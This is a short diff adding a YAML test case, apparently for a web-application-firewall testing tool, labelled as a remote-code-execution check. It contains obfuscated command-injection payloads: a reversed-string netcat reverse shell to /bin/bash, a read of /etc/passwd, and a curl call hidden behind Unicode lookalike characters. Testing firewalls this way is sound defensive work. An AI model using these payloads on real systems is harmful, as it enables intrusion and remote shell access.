@@ -1,0 +1,15 @@
+---
+payload:
+  - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+  - /etc/passwd
+  - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
+
+encoder:
+  - URL
+placeholder:
+  - URLParam
+  - HTMLForm
+  - HTMLMultipartForm
+  - JSONRequest
+type: "RCE"
+...
